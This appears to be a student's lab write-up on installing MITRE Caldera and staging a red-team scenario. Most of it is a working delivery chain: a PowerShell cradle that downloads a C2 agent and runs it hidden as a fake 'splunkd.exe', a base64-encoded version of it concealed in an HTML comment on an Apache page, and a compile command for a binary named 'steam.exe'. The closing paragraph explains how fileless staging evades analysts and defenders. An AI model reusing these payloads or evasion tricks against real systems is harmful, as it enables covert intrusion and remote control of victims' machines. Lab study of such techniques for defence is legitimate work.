# Caldera Installation and Scenario 2 Setup

## Caldera Installation

```bash
sudo apt update
sudo apt install -y build-essential libssl-dev zlib1g-dev libncurses5-dev \
libncursesw5-dev libreadline-dev libsqlite3-dev libgdbm-dev libdb5.3-dev \
libbz2-dev libexpat1-dev liblzma-dev tk-dev libffi-dev uuid-dev wget
cd /usr/src
sudo wget https://www.python.org/ftp/python/3.11.9/Python-3.11.9.tgz
sudo tar xzf Python-3.11.9.tgz
cd Python-3.11.9
sudo ./configure --enable-optimizations
sudo make altinstall
sudo apt install golang
mkdir caldera
cd ~/caldera
sudo apt install -y nodejs npm
python3.11 -m venv venv311
source venv311/bin/activate
pip install docker
git clone https://github.com/mitre/caldera.git --recursive
cd caldera
pip install -r requirements.txt
python3 server.py --insecure --build
```

## Start Caldera

```bash
cd ~/caldera
source venv311/bin/activate
python3 server.py --insecure

sudo apt install g++-mingw-w64-x86-64
```

# Scenario Setup

```bash
sudo apt install apache2
sudo systemctl start apache2
```


## Create the file that contain the payload
```bash
sudo nano /var/www/html/payload.html
```


## First, creating the initial Powershell payload in Caldera

```powershell
$server="http://192.168.139.138:8888";$url="$server/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");
$wc.Headers.add("file","sandcat.go");$data=$wc.DownloadData($url);get-process | ? {$_.modules.filename -like "C:\Users\Public\splunkd.exe"} | 
stop-process -f;rm -force "C:\Users\Public\splunkd.exe" -ea ignore;[io.file]::WriteAllBytes("C:\Users\Public\splunkd.exe",$data) | 
Out-Null;Start-Process -FilePath C:\Users\Public\splunkd.exe -ArgumentList "-server $server -group red" -WindowStyle hidden

```

## Second, encode to base64, run these command in Powershell

```powershell
$command = '$server="http://192.168.139.138:8888";$url="$server/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$data=$wc.DownloadData($url);get-process | ? {$_.modules.filename -like "C:\Users\Public\splunkd.exe"} | stop-process -f;rm -force "C:\Users\Public\splunkd.exe" -ea ignore;[io.file]::WriteAllBytes("C:\Users\Public\splunkd.exe",$data)|Out-Null;Start-Process -FilePath C:\Users\Public\splunkd.exe -ArgumentList "-server $server -group red" -WindowStyle hidden'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)
$encoded

# I used the Unicode encoding because Powershell -EncodedCommand parameter require Unicode (UTF-16LE)
```
## Then we will get the payload: 
```
JABzAGUAcgB2AGUAcgA9ACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAzADkALgAxADMAOAA6ADgAOAA4ADgAIgA7ACQAdQByAGwAPQAiACQAcwBlAHIAdgBlAHIALwBmAGkAbABlAC8AZABvAHcAbgBsAG8AYQBkACIAOwAkAHcAYwA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOwAkAHcAYwAuAEgAZQBhAGQAZQByAHMALgBhAGQAZAAoACIAcABsAGEAdABmAG8AcgBtACIALAAiAHcAaQBuAGQAbwB3AHMAIgApADsAJAB3AGMALgBIAGUAYQBkAGUAcgBzAC4AYQBkAGQAKAAiAGYAaQBsAGUAIgAsACIAcwBhAG4AZABjAGEAdAAuAGcAbwAiACkAOwAkAGQAYQB0AGEAPQAkAHcAYwAuAEQAbwB3AG4AbABvAGEAZABEAGEAdABhACgAJAB1AHIAbAApADsAZwBlAHQALQBwAHIAbwBjAGUAcwBzACAAfAAgAD8AIAB7ACQAXwAuAG0AbwBkAHUAbABlAHMALgBmAGkAbABlAG4AYQBtAGUAIAAtAGwAaQBrAGUAIAAiAEMAOgBcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwAcwBwAGwAdQBuAGsAZAAuAGUAeABlACIAfQAgAHwAIABzAHQAbwBwAC0AcAByAG8AYwBlAHMAcwAgAC0AZgA7AHIAbQAgAC0AZgBvAHIAYwBlACAAIgBDADoAXABVAHMAZQByAHMAXABQAHUAYgBsAGkAYwBcAHMAcABsAHUAbgBrAGQALgBlAHgAZQAiACAALQBlAGEAIABpAGcAbgBvAHIAZQA7AFsAaQBvAC4AZgBpAGwAZQBdADoAOgBXAHIAaQB0AGUAQQBsAGwAQgB5AHQAZQBzACgAIgBDADoAXABVAHMAZQByAHMAXABQAHUAYgBsAGkAYwBcAHMAcABsAHUAbgBrAGQALgBlAHgAZQAiACwAJABkAGEAdABhACkAfABPAHUAdAAtAE4AdQBsAGwAOwBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAALQBGAGkAbABlAFAAYQB0AGgAIABDADoAXABVAHMAZQByAHMAXABQAHUAYgBsAGkAYwBcAHMAcABsAHUAbgBrAGQALgBlAHgAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIAAiAC0AcwBlAHIAdgBlAHIAIAAkAHMAZQByAHYAZQByACAALQBnAHIAbwB1AHAAIAByAGUAZAAiACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABoAGkAZABkAGUAbgA=

```
## Then paste the payload to the payload.html file to host it in the server

```html
<!DOCTYPE html>
<html>
<body>
<!-- PAYLOAD: JABzAGUAcgB2AGUAcgA9ACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAzADkALgAxADMAOAA6ADgAOAA4ADgAIgA7ACQAdQByAGwAPQAiACQAcwBlAHIAdgBlAHIALwBmAGkAbABlAC8AZABvAHcAbgBsAG8AYQBkACIAOwAkAHcAYwA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOwAkAHcAYwAuAEgAZQBhAGQAZQByAHMALgBhAGQAZAAoACIAcABsAGEAdABmAG8AcgBtACIALAAiAHcAaQBuAGQAbwB3AHMAIgApADsAJAB3AGMALgBIAGUAYQBkAGUAcgBzAC4AYQBkAGQAKAAiAGYAaQBsAGUAIgAsACIAcwBhAG4AZABjAGEAdAAuAGcAbwAiACkAOwAkAGQAYQB0AGEAPQAkAHcAYwAuAEQAbwB3AG4AbABvAGEAZABEAGEAdABhACgAJAB1AHIAbAApADsAZwBlAHQALQBwAHIAbwBjAGUAcwBzACAAfAAgAD8AIAB7ACQAXwAuAG0AbwBkAHUAbABlAHMALgBmAGkAbABlAG4AYQBtAGUAIAAtAGwAaQBrAGUAIAAiAEMAOgBcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwAcwBwAGwAdQBuAGsAZAAuAGUAeABlACIAfQAgAHwAIABzAHQAbwBwAC0AcAByAG8AYwBlAHMAcwAgAC0AZgA7AHIAbQAgAC0AZgBvAHIAYwBlACAAIgBDADoAXABVAHMAZQByAHMAXABQAHUAYgBsAGkAYwBcAHMAcABsAHUAbgBrAGQALgBlAHgAZQAiACAALQBlAGEAIABpAGcAbgBvAHIAZQA7AFsAaQBvAC4AZgBpAGwAZQBdADoAOgBXAHIAaQB0AGUAQQBsAGwAQgB5AHQAZQBzACgAIgBDADoAXABVAHMAZQByAHMAXABQAHUAYgBsAGkAYwBcAHMAcABsAHUAbgBrAGQALgBlAHgAZQAiACwAJABkAGEAdABhACkAfABPAHUAdAAtAE4AdQBsAGwAOwBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAALQBGAGkAbABlAFAAYQB0AGgAIABDADoAXABVAHMAZQByAHMAXABQAHUAYgBsAGkAYwBcAHMAcABsAHUAbgBrAGQALgBlAHgAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIAAiAC0AcwBlAHIAdgBlAHIAIAAkAHMAZQByAHYAZQByACAALQBnAHIAbwB1AHAAIAByAGUAZAAiACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABoAGkAZABkAGUAbgA=
-->
</body>
</html>
```

I hid the payload in an HTML comment so visitors who open the page will just see a blank page.

# Compiled the malware C++ file in Linux
```
x86_64-w64-mingw32-g++ caldera_exploit.cpp -o steam.exe \
    -lws2_32 -lwininet -liphlpapi -lwinhttp \
    -static-libgcc -static-libstdc++ -static
```
### This approach of malware I learnt through my research on filess malware. At this point, the payload is dynamic, attacker can change the payload when ever they want and they still can use the old malware. And the obfuscation layers, the analysis just have the C++ binary file, and this file just contain the download logic, not the  payload, the analysis can analize the decode things, but attacker can change the server whenever they want, so analysis will not be able to get the payload. This approach is best for metasploit or any tools like that, in this project I used Caldera, so I have to do for it. Because Caldera will leave a file in the victim machine when the command is executed, so the defender will discover it instantly, if we use the C2 server, it just leave a connection to the server and we can execute command from the shell that we got.
